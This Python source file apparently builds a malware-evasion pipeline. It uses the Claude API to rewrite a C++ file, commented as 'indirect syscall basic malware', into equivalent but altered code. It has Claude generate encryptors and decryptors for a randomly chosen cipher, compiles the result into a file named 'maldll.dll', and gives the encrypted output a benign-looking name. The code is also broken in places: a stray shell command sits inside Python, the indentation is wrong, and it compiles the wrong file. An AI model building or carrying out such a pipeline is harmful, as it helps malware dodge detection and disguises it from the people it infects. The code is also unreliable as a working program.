import anthropic
import os
import subprocess
import tempfile
import base64
import zlib
import random

class CPPEncryptedExecutor:
    def __init__(self, api_key=None):
        """Initialize with optional API key for Claude modifications."""
        if api_key is None:
            api_key = os.environ.get("ANTHROPIC_API_KEY")#haser 3 shekel ): suing pepper for matach
        self.api_key = api_key
        if api_key:
            self.client = anthropic.Anthropic(api_key=api_key)
    
    def modify_and_encrypt(self, input_cpp, output_encrypted):
        if not self.api_key:
            raise ValueError("API key required for Claude modifications")
        
        
        with open(input_cpp, 'r', encoding='utf-8') as f:
            cpp_code = f.read()
        
        
        encryption_methods = [
            "RC5 - Rivest Cipher 5",
            "TEA - Tiny Encryption Algorithm",
            "Skipjack - NSA block cipher",
            "RC6 - Rivest Cipher 6",
            "SAFER - Secure And Fast Encryption Routine",
            "RC4 - Rivest Cipher 4 stream cipher",
            "Khufu - Feistel cipher",
            "CAST-128 - Carlisle Adams and Stafford Tavares cipher",
            "Lucifer - IBM's early block cipher",
            "Treyfer - Lightweight block cipher",
            "DES-like cipher - Data Encryption Standard variant",
            "Mars - AES candidate cipher",
            "Speck - NSA lightweight cipher"
        ]
        
        # choose random encryption method
        new_method = random.choice(encryption_methods)
        print(f"Selected encryption method: {new_method}")
        
        
        prompt1 = f"""Modify this C++ code slightly while keeping all functionality the same. Make small changes like:
- Renaming variables
- Reordering functions
- Changing code structure
- Using different but equivalent logic

```cpp
{cpp_code}
```

Return ONLY the complete modified C++ code without explanations."""
        
        print("Sending to Claude for C++ modification...")
        message1 = self.client.messages.create(
            model="claude-sonnet-4-5-20250929",
            max_tokens=8000,
            messages=[{"role": "user", "content": prompt1}]
        )
        
        modified_code = message1.content[0].text
        
        # Clean markdown fences
        if "```cpp" in modified_code:
            modified_code = modified_code.split("```cpp", 1)[1].split("```", 1)[0]
        elif "```" in modified_code:
            modified_code = modified_code.split("```", 1)[1].split("```", 1)[0]
        
        modified_code = modified_code.strip()
        
        # Save modified code to temporary file
        temp_cpp = "temp_modified.cpp"
        with open(temp_cpp, 'w', encoding='utf-8') as f:
            f.write(modified_code)
        
        print(f"Modified code saved to '{temp_cpp}'")
        
        # Second Claude call: Create Python encryption script
        prompt2 = (
            f"Create a Python script that performs {new_method} encryption on a file.\n\n"
            "The script should:\n"
            "1. Read a C++ file path from command line argument (sys.argv[1])\n"
            "2. Read the file contents\n"
            "3. Encrypt the contents using the specified encryption method\n"
            "4. Write the encrypted result to the output file path from sys.argv[2]\n\n"
            "Use pure Python or standard library only if possible. Include proper error handling.\n"
            "Return ONLY the Python code without explanations."
        )
        
        print("Sending to Claude for encryption script generation...")
        message2 = self.client.messages.create(
            model="claude-sonnet-4-5-20250929",
            max_tokens=8000,
            messages=[{"role": "user", "content": prompt2}]
        )
        
        encryptor_code = message2.content[0].text
        
        # Clean markdown fences (looking for Python this time)
        if "```python" in encryptor_code:
            encryptor_code = encryptor_code.split("```python", 1)[1].split("```", 1)[0]
        elif "```py" in encryptor_code:
            encryptor_code = encryptor_code.split("```py", 1)[1].split("```", 1)[0]
        elif "```" in encryptor_code:
            encryptor_code = encryptor_code.split("```", 1)[1].split("```", 1)[0]
        
        encryptor_code = encryptor_code.strip()
        
        # Save encryption script
        script_path = "encryptor.py"
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(encryptor_code)
        
        print(f"Encryption script saved to '{script_path}'")

        prompt3 = (
            f"Create a c++ script that performs {new_method} decryption on a file.\n\n"
            "The script should:\n"
            "1. Read a file path from command line argument (sys.argv[1])\n"
            "2. Read the file contents\n"
            "3. decrypt the contents using the specified decryption method\n"
            "4. Write the decrypted result to the output file path from sys.argv[2]\n\n"
            "Use pure Python or standard library only if possible. Include proper error handling.\n"
            "Return ONLY the Python code without explanations."
        )
        
        print("Sending to Claude for decryption script generation...")
        message3 = self.client.messages.create(
            model="claude-sonnet-4-5-20250929",
            max_tokens=8000,
            messages=[{"role": "user", "content": prompt3}]
        )
        decryptor_code = message3.content[0].text
        decrypt_path = "decryptor.cpp"
        # Clean markdown fences (looking for Python this time)
        if "```python" in decryptor_code:
            decryptor_code = decryptor_code.split("```python", 1)[1].split("```", 1)[0]
        elif "```py" in decryptor_code:
            decryptor_code = decryptor_code.split("```py", 1)[1].split("```", 1)[0]
        elif "```" in decryptor_code:
            decryptor_code = decryptor_code.split("```", 1)[1].split("```", 1)[0]
        
        decryptor_code = decryptor_code.strip()
        
        # Save encryption script
        with open(decrypt_path, 'w', encoding='utf-8') as f:
            f.write(decryptor_code)

        x86_64-w64-mingw32-g++ -O2 -shared -DMYLIB_BUILD -o mylib.dll mylib.cpp -Wl,--out-implib=libmylib.dll.a -static-libstdc++ -static-libgcc
        

        
        output_dll = "maldll.dll"#dll path 

        try:
        # Compile the  encrypted C++ file into a Windows DLL
            result = subprocess.run(
                [
                "x86_64-w64-mingw32-g++",
                "-O2",
                "-shared",
                "-DMYLIB_BUILD",
                "-o", output_dll,
                script_path,
                "-Wl,--out-implib=libmylib.dll.a",
                "-static-libstdc++",
                "-static-libgcc"
            ],
            capture_output=True,
            text=True,
            check=True,
            timeout=60
    )
        print("Compilation executed successfully.")
        if result.stdout:
            print("Compiler output:", result.stdout)
        if result.stderr:
            print("Compiler warnings:", result.stderr)
    except subprocess.CalledProcessError as e:
        print(f"Error during compilation: {e}")
        print(f"Stderr: {e.stderr}")
        if os.path.exists(output_dll):
            os.remove(output_dll)
    except subprocess.TimeoutExpired:
        print("Compilation timed out.")
        if os.path.exists(output_dll):
            os.remove(output_dll)

        output_encrypted = "encrypteddll.enc"
        # Run the encryption script on the modified C++ file
        try:
            result = subprocess.run(
                ["python3", script_path, temp_cpp, output_encrypted], 
                capture_output=True, 
                text=True, 
                check=True,
                timeout=30
            )
            print("Encryption script executed successfully")
            if result.stdout:
                print("Script output:", result.stdout)
            if result.stderr:
                print("Script warnings:", result.stderr)
        except subprocess.CalledProcessError as e:
            print(f"Error running encryption script: {e}")
            print(f"Stderr: {e.stderr}")
            # Clean up and exit
            if os.path.exists(temp_cpp):
                os.remove(temp_cpp)
            return
        except subprocess.TimeoutExpired:
            print("Encryption script timed out")
            if os.path.exists(temp_cpp):
                os.remove(temp_cpp)
            return
        
        # Clean up temp file
        if os.path.exists(temp_cpp):
            os.remove(temp_cpp)
        
        print(f"Final encrypted file saved to '{output_encrypted}'")


if __name__ == "__main__":
    executor = CPPEncryptedExecutor()#class
    
    # Example 1: Modify and encrypt with random encryption method
    print("=== MODIFYING AND ENCRYPTING ===")
    executor.modify_and_encrypt(
        input_cpp="malwery.cpp",#the indirect syscall basic malware
        output_encrypted="normal_app_that_i_like.cpp.enc"#final encrypted dll
    )
    